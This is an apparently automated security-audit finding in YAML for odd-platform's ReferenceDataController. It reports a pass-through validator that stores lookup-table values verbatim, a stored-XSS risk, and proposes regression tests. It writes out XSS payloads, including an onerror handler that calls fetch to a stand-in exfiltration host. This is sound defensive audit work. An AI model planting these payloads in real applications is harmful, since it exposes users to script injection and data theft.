@@ -1,0 +1,67 @@
+gap_id: TEST-GAP-733
+category: missing-security
+criticality: HIGH
+node_ids:
+  - "odd-platform java ReferenceDataController controller-class:ReferenceDataController"
+pillars_affected: [P-03, P-09]
+surfaced_by:
+  - "ReferenceDataController.md:bugs_limitations_corner_cases.[1] (Lookup table row values are persisted unchanged — LookupCharValidator.getValue returns the input string verbatim — same audience surface as F-004 stored-XSS family — severity HIGH)"
+  - "ReferenceDataController.md:security.known_security_gaps.[1] (Stored-XSS surface on row values + column names + table name + description — all `type: string` with no maxLength / pattern in OpenAPI; LookupCharValidator returns input verbatim. Sibling to F-004 description-editing stored-XSS family — severity HIGH)"
+  - "ReferenceDataController.md:security.data_exposure (Possible XSS payload round-trip: row value containing HTML/JS is stored verbatim, returned verbatim — UI render contract decides the final attack surface. Same F-004 family.)"
+  - "ReferenceDataController.md:docs_link_semantic.doc_drift_findings (Doc page does NOT discuss XSS / input-validation posture on row values, column names, or table names)"
+behaviour: |-
+  **HIGH — `LookupCharValidator.getValue` returns the input string verbatim — the Lookup-Table row-value surface is the F-004 stored-XSS family's MASTER-DATA-MANAGEMENT sibling.** Primary-source confirmed in the batch-V ReferenceDataController sidecar:
+
+  - **Validator tier — pass-through**: `LookupCharValidator.java:14-17` declares `public Object getValue(final String value, final String columnName) { return value; }` — the "validator" name is misleading; the implementation is a no-op pass-through. Any input string is accepted verbatim.
+  - **Repository tier — parameterised but unsanitized**: `ReferenceDataRepositoryImpl.java:117-150` (`addDataToLookupTable`) uses `DSL.val(...)` for SQL safety (SQL injection mitigated), but applies NO content-side sanitization, NO length cap, NO scheme allowlist, NO encoding.
+  - **OpenAPI schema tier — no constraint**: `components.yaml:4006-4025` declares `LookupTableRowColumnFormData.value: type: string` with NO `maxLength`, NO `pattern`, NO `format`.
+  - **Table + column metadata tier — same pass-through**: `LookupTableFieldFormData` (`components.yaml:3863-3882`) has no constraint on `name`, `description`, `default_value`. Operators authoring a column named `<script>alert(1)</script>` succeed; the column-name persists verbatim.
+
+  **Cross-family with F-004**: F-004 names the description-editing stored-XSS surface family on the entity-side. This gap adds the Master-Data-Management (P-03) sibling: a lookup table row value, a column name, a table name, or a description field, stored verbatim, can carry `<script>` / `<img onerror>` / `javascript:` payloads through to UI render. The Lookup Tables surface is read-collaborative-posture (per the sister `bugs_limitations_corner_cases.[0]` finding — every authenticated user reads any lookup table), so the blast radius is the entire authenticated-user pool.
+
+  **Compound failure with `buildTableName` collision (TEST-GAP-734)**: the unsafe input acceptance at the row-value surface combines with the lossy `buildTableName` lowercasing at the table-name surface — two distinct vulnerabilities on the same controller. The aggregate finding is that the Lookup Tables surface has the SAME F-004 verbatim-storage class as the entity description surface, plus an additional table-name collision class. The doc page (per sidecar `doc_drift_findings`) discloses NEITHER class.
+
+  **Operator-observable consequences**:
+  - A row value `<img src=x onerror=fetch('https://evil.example/exfil')>` in a Lookup Table renders to every authenticated user viewing the table — including operators auditing the table in the Master Data tab.
+  - A column name `<script>alert(1)</script>` in a Lookup Table renders to every authenticated user viewing the schema view of the table.
+  - The Lookup Tables UI renders these fields in three contexts (table details page, faceted search results, the schema view). Each context is a separate XSS surface; the F-004 family's UI-tier defence (Markdown.tsx) may NOT apply (these are NOT Markdown-rendered fields, they are plain-text fields rendered by table grid components — different defence-in-depth contract).
+
+  **Why HIGH not CRITICAL**: the Master-Data-Management surface is operator-curated by definition (P-03 is "operator-curated reference data"); attackers with `LOOKUP_TABLE_DATA_CREATE` are presumed operator-trusted. BUT the read-collaborative posture means EVERY authenticated user reads every lookup table cross-namespace — so the read-tier attack surface is wider than the write-tier permission grant. Plus the doc page does NOT disclose the read-collaborative posture or the verbatim-storage contract — operators cannot author RBAC policies that contain this. HIGH.
+
+  **Test gap shape**: regression-pin at the BACKEND tier asserting verbatim storage for row values, column names, and table names. Pair with a UI-tier dynamic probe extension verifying that the table-grid render path applies (or does NOT apply — TBD) the F-004 sibling defence.
+test_files_existing:
+  - "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/service/LookupDataServiceTest.java (service-tier; does NOT exercise XSS payload persistence)"
+test_files_proposed:
+  path: "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/ReferenceDataStoredXssBackendContractTest.java"
+  name: "addDataToLookupTable_rowValueAndColumnNameAndTableNameWithScriptPayloads_persistVerbatim_pinsF004P03SiblingBackendContract"
+evidence:
+  - "ReferenceDataController.md says (bugs_limitations_corner_cases.[1]): 'Lookup table row values are persisted unchanged — LookupCharValidator.getValue returns the input string verbatim (LookupCharValidator.java:14-17). Values are read back via /api/referencedata/table/{id}/data and rendered in the UI. Same audience surface as F-004 stored-XSS family (description editing) — no <script>-tag stripping, no length cap, no HTML escaping at the storage layer. A row containing <img src=x onerror=alert(1)> would round-trip intact.' — severity HIGH"
+  - "ReferenceDataController.md says (security.known_security_gaps.[1]): 'Stored-XSS surface on row values + column names + table name + description (all type: string with no maxLength / pattern in OpenAPI; LookupCharValidator returns input verbatim). Sibling to F-004 description-editing stored-XSS family.' — severity HIGH"
+  - "ReferenceDataController.md says (security.data_exposure): 'Possible XSS payload round-trip: row value containing HTML/JS is stored verbatim, returned verbatim — UI render contract decides the final attack surface. Same F-004 family.'"
+  - "ReferenceDataController.md says (docs_link_semantic.doc_drift_findings): 'Doc page does NOT discuss XSS / input-validation posture on row values, column names, or table names (verified via WebFetch 2026-05-20). The platform writes user-authored values back into the catalog FTS index (ReactiveLookupTableSearchEntrypointRepositoryImpl exists) — same audience surface as F-004 description-editing stored-XSS family.'"
+  - "Verified at primary source: LookupCharValidator.java:14-17 (`public Object getValue(final String value, final String columnName) { return value; }`)"
+cross_references:
+  - "F-004 (stored-XSS family — this gap adds the P-03 Master-Data-Management sibling)"
+  - "TEST-GAP-664 (DatasetField verbatim-storage XSS — F-004 sibling at column description)"
+  - "TEST-GAP-732 (NEW batch V — QueryExample F-004 4th surface — sister Master-Data-adjacent vector)"
+  - "TEST-GAP-720 (Term-mention auto-link side-channel XSS — sister surface)"
+  - "TEST-GAP-734 (NEW batch V — ReferenceData buildTableName collision — compound bug on same controller)"
+  - "P-009 dynamic-verification probe (recommend extension to cover the Lookup Tables Master Data tab render surface)"
+  - "REFACTOR-NNN candidate: apply Jsoup.clean or similar HTML sanitisation at the LookupCharValidator.getValue layer (the natural choke-point); OR change OpenAPI schema to declare maxLength + pattern on row-value and column-name fields"
+  - "DOC-NNN candidate: surface the verbatim-storage contract on the Lookup Tables doc page; surface the read-collaborative-posture-applies-to-Lookup-Tables note"
+  - "concepts: f004-fifth-surface-lookup-tables-row-and-schema-values (NEW concept candidate)"
+related_features: [F-004]
+related_pillar_features: ["P-03:F-001", "P-09:F-NN-XSS-defence"]
+proposed_action: |-
+  Add `ReferenceDataStoredXssBackendContractTest` at `odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/`. Five test methods:
+  1. `addDataToLookupTable_rowValueWithScriptTag_persistsVerbatim` — POST `/api/referencedata/table/{id}/data` with `items: [{ value: "<script>alert('xss')</script>", ... }]`; assert HTTP 200; GET `/api/referencedata/table/{id}/data`; assert the row's value byte-equals the payload.
+  2. `addDataToLookupTable_rowValueWithImgOnerror_persistsVerbatim` — sister test on a different XSS payload class.
+  3. `createLookupTable_tableNameWithScriptTag_persistsAfterBuildTableNameLossyNormalization` — POST `/api/referencedata/table` with `name: "<script>alert(1)</script>"`; assert the resulting physical table name is the lowercased + underscore-replaced version of the script tag (the buildTableName function applies, see TEST-GAP-734); assert the CATALOG-side name (in the `lookup_tables` row) stores the verbatim `<script>alert(1)</script>` string. PIN both layers of the contract.
+  4. `addColumnsToLookupTable_columnNameWithScriptTag_persistsVerbatim` — POST `/api/referencedata/table/{id}/columns` with `items: [{ name: "<script>...", description: "..." }]`; assert the column-name is stored verbatim in the column-metadata catalog (the schema view renders this name).
+  5. `getReferenceDataSearchResults_returnsLookupTablesWithVerbatimNames_pinsCrossNamespaceVisibility` — pin the read-tier exposure: any authenticated user can search lookup tables across all namespaces and receive verbatim XSS payloads in the search results.
+
+  Add a `// CONTRACT PIN — F-004 family P-03 Master-Data-Management sibling: lookup table row values, column names, table names are stored verbatim. The Lookup Tables UI does NOT use the Markdown.tsx wrapper (these are plain-text fields rendered via table-grid components — different defence-in-depth from the entity description surface). A REFACTOR adding LookupCharValidator HTML sanitization will flip these tests to assert sanitiser output. The dynamic-verification probe P-009 should be extended to verify the table-grid render path independently.` comment block.
+
+  Pair with: (a) extend P-009 dynamic-verification to cover the Lookup Tables Master Data tab render surface; (b) DOC-NNN — disclose verbatim-storage contract on the Lookup Tables doc page.
+batch: 2026-05-20-V
+feature_id: F-004
